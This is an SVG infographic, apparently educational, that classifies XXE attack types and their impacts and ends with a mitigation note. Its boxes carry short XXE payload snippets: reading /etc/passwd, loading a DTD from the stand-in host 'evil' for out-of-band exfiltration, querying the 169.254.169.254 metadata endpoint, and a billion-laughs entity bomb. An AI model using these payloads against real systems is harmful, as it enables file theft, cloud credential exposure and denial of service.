<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 420">
  <defs>
    <style>
      text { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
      .mono { font-family: 'Fira Code', 'Courier New', monospace; }
    </style>
  </defs>

  <rect width="800" height="420" fill="#0a0e17"/>

  <!-- Center title box -->
  <rect x="310" y="20" width="180" height="36" rx="3" fill="#111827" stroke="#ff0040" stroke-width="1.5"/>
  <text x="400" y="43" text-anchor="middle" fill="#ff0040" font-size="14" font-weight="700">XXE Attacks</text>

  <!-- Connecting lines from title to each box -->
  <!-- Classic XXE -->
  <line x1="345" y1="56" x2="90" y2="110" stroke="#1e293b" stroke-width="1"/>
  <!-- Blind XXE -->
  <line x1="370" y1="56" x2="250" y2="110" stroke="#1e293b" stroke-width="1"/>
  <!-- Error-based -->
  <line x1="400" y1="56" x2="400" y2="110" stroke="#1e293b" stroke-width="1"/>
  <!-- SSRF via XXE -->
  <line x1="430" y1="56" x2="550" y2="110" stroke="#1e293b" stroke-width="1"/>
  <!-- DoS -->
  <line x1="455" y1="56" x2="710" y2="110" stroke="#1e293b" stroke-width="1"/>

  <!-- Box 1: Classic XXE -->
  <rect x="20" y="110" width="140" height="58" rx="3" fill="#111827" stroke="#ff0040" stroke-width="1"/>
  <text x="90" y="132" text-anchor="middle" fill="#ff0040" font-size="12" font-weight="600">Classic XXE</text>
  <line x1="20" y1="140" x2="160" y2="140" stroke="#1e293b" stroke-width="0.6"/>
  <text x="90" y="155" text-anchor="middle" fill="#e2e8f0" font-size="9">Direct file read</text>
  <text x="90" y="164" text-anchor="middle" fill="#4a5568" font-size="8" class="mono">file:///etc/passwd</text>

  <!-- Box 2: Blind XXE -->
  <rect x="180" y="110" width="140" height="58" rx="3" fill="#111827" stroke="#ffb000" stroke-width="1"/>
  <text x="250" y="132" text-anchor="middle" fill="#ffb000" font-size="12" font-weight="600">Blind XXE</text>
  <line x1="180" y1="140" x2="320" y2="140" stroke="#1e293b" stroke-width="0.6"/>
  <text x="250" y="155" text-anchor="middle" fill="#e2e8f0" font-size="9">Out-of-Band exfil</text>
  <text x="250" y="164" text-anchor="middle" fill="#4a5568" font-size="8">OOB via HTTP/DNS</text>

  <!-- Box 3: Error-based -->
  <rect x="340" y="110" width="140" height="58" rx="3" fill="#111827" stroke="#ffb000" stroke-width="1"/>
  <text x="410" y="132" text-anchor="middle" fill="#ffb000" font-size="12" font-weight="600">Error-based</text>
  <line x1="340" y1="140" x2="480" y2="140" stroke="#1e293b" stroke-width="0.6"/>
  <text x="410" y="155" text-anchor="middle" fill="#e2e8f0" font-size="9">Leaks via errors</text>
  <text x="410" y="164" text-anchor="middle" fill="#4a5568" font-size="8">Error message leaks</text>

  <!-- Box 4: SSRF via XXE -->
  <rect x="500" y="110" width="140" height="58" rx="3" fill="#111827" stroke="#bf00ff" stroke-width="1"/>
  <text x="570" y="132" text-anchor="middle" fill="#bf00ff" font-size="12" font-weight="600">SSRF via XXE</text>
  <line x1="500" y1="140" x2="640" y2="140" stroke="#1e293b" stroke-width="0.6"/>
  <text x="570" y="155" text-anchor="middle" fill="#e2e8f0" font-size="9">Internal network access</text>
  <text x="570" y="164" text-anchor="middle" fill="#4a5568" font-size="8" class="mono">169.254.169.254</text>

  <!-- Box 5: DoS (Billion Laughs) -->
  <rect x="660" y="110" width="120" height="58" rx="3" fill="#111827" stroke="#ff0040" stroke-width="1"/>
  <text x="720" y="129" text-anchor="middle" fill="#ff0040" font-size="11" font-weight="600">DoS</text>
  <text x="720" y="140" text-anchor="middle" fill="#ff0040" font-size="9">(Billion Laughs)</text>
  <line x1="660" y1="146" x2="780" y2="146" stroke="#1e293b" stroke-width="0.6"/>
  <text x="720" y="160" text-anchor="middle" fill="#e2e8f0" font-size="9">Entity expansion</text>

  <!-- XML Snippets below each box -->
  <!-- Snippet 1: Classic XXE -->
  <rect x="8" y="186" width="164" height="56" rx="3" fill="#111827" stroke="#1e293b" stroke-width="0.6"/>
  <text x="16" y="200" fill="#ff0040" font-size="8" class="mono">&lt;!ENTITY xxe SYSTEM</text>
  <text x="16" y="212" fill="#ff0040" font-size="8" class="mono">  "file:///etc/passwd"&gt;</text>
  <text x="16" y="226" fill="#e2e8f0" font-size="8" class="mono">&lt;data&gt;&amp;xxe;&lt;/data&gt;</text>

  <!-- Snippet 2: Blind XXE -->
  <rect x="178" y="186" width="144" height="56" rx="3" fill="#111827" stroke="#1e293b" stroke-width="0.6"/>
  <text x="186" y="200" fill="#ffb000" font-size="8" class="mono">&lt;!ENTITY % xxe SYSTEM</text>
  <text x="186" y="212" fill="#ffb000" font-size="8" class="mono">  "http://evil/dtd"&gt;</text>
  <text x="186" y="226" fill="#e2e8f0" font-size="8" class="mono">%xxe;</text>

  <!-- Snippet 3: Error-based -->
  <rect x="334" y="186" width="154" height="56" rx="3" fill="#111827" stroke="#1e293b" stroke-width="0.6"/>
  <text x="342" y="200" fill="#ffb000" font-size="8" class="mono">&lt;!ENTITY % file SYSTEM</text>
  <text x="342" y="212" fill="#ffb000" font-size="8" class="mono">  "file:///etc/passwd"&gt;</text>
  <text x="342" y="226" fill="#e2e8f0" font-size="8" class="mono">&lt;!ENTITY % err "nonexist/%file;"&gt;</text>

  <!-- Snippet 4: SSRF via XXE -->
  <rect x="494" y="186" width="152" height="56" rx="3" fill="#111827" stroke="#1e293b" stroke-width="0.6"/>
  <text x="502" y="200" fill="#bf00ff" font-size="8" class="mono">&lt;!ENTITY xxe SYSTEM</text>
  <text x="502" y="212" fill="#bf00ff" font-size="7.5" class="mono">"http://169.254.169.254</text>
  <text x="502" y="224" fill="#bf00ff" font-size="7.5" class="mono">  /latest/meta-data/"&gt;</text>
  <text x="502" y="237" fill="#e2e8f0" font-size="8" class="mono">&amp;xxe;</text>

  <!-- Snippet 5: Billion Laughs -->
  <rect x="652" y="186" width="138" height="56" rx="3" fill="#111827" stroke="#1e293b" stroke-width="0.6"/>
  <text x="660" y="200" fill="#ff0040" font-size="8" class="mono">&lt;!ENTITY lol "lol"&gt;</text>
  <text x="660" y="212" fill="#ff0040" font-size="7.5" class="mono">&lt;!ENTITY lol2 "&amp;lol;&amp;lol;...</text>
  <text x="660" y="224" fill="#ff0040" font-size="7.5" class="mono">  &amp;lol;&amp;lol;&amp;lol;"&gt;</text>
  <text x="660" y="236" fill="#4a5568" font-size="7" class="mono">... (9 levels deep)</text>

  <!-- Impact severity row -->
  <text x="400" y="272" text-anchor="middle" fill="#e2e8f0" font-size="11" font-weight="600">Impact Classification</text>
  <line x1="30" y1="280" x2="770" y2="280" stroke="#1e293b" stroke-width="0.6"/>

  <!-- Impact boxes -->
  <rect x="30" y="290" width="140" height="32" rx="3" fill="#111827" stroke="#ff0040" stroke-width="0.8"/>
  <text x="100" y="303" text-anchor="middle" fill="#ff0040" font-size="9" font-weight="600">Confidentiality</text>
  <text x="100" y="315" text-anchor="middle" fill="#e2e8f0" font-size="8">File read, data exfil</text>

  <rect x="190" y="290" width="140" height="32" rx="3" fill="#111827" stroke="#bf00ff" stroke-width="0.8"/>
  <text x="260" y="303" text-anchor="middle" fill="#bf00ff" font-size="9" font-weight="600">Network Access</text>
  <text x="260" y="315" text-anchor="middle" fill="#e2e8f0" font-size="8">SSRF, port scanning</text>

  <rect x="350" y="290" width="140" height="32" rx="3" fill="#111827" stroke="#ffb000" stroke-width="0.8"/>
  <text x="420" y="303" text-anchor="middle" fill="#ffb000" font-size="9" font-weight="600">Availability</text>
  <text x="420" y="315" text-anchor="middle" fill="#e2e8f0" font-size="8">DoS, resource exhaust</text>

  <rect x="510" y="290" width="140" height="32" rx="3" fill="#111827" stroke="#ff0040" stroke-width="0.8"/>
  <text x="580" y="303" text-anchor="middle" fill="#ff0040" font-size="9" font-weight="600">Execution</text>
  <text x="580" y="315" text-anchor="middle" fill="#e2e8f0" font-size="8">RCE via expect://</text>

  <!-- Mitigation note -->
  <rect x="30" y="340" width="740" height="36" rx="3" fill="#111827" stroke="#00ff41" stroke-width="0.8" stroke-dasharray="3,2"/>
  <text x="44" y="356" fill="#00ff41" font-size="9" font-weight="600">Mitigation:</text>
  <text x="110" y="356" fill="#e2e8f0" font-size="9">Disable DTDs and external entities. Use </text>
  <text x="360" y="356" fill="#00ff41" font-size="9" class="mono">FEATURE_SECURE_PROCESSING</text>
  <text x="560" y="356" fill="#e2e8f0" font-size="9"> or </text>
  <text x="576" y="356" fill="#00ff41" font-size="9" class="mono">libxml_disable_entity_loader(true)</text>
  <text x="44" y="370" fill="#4a5568" font-size="8">OWASP: XML External Entity Prevention Cheat Sheet</text>

  <!-- Copyright -->
  <text x="788" y="414" text-anchor="end" fill="#4a5568" font-size="8" opacity="0.6">(c) Abdulrahman Majid</text>
</svg>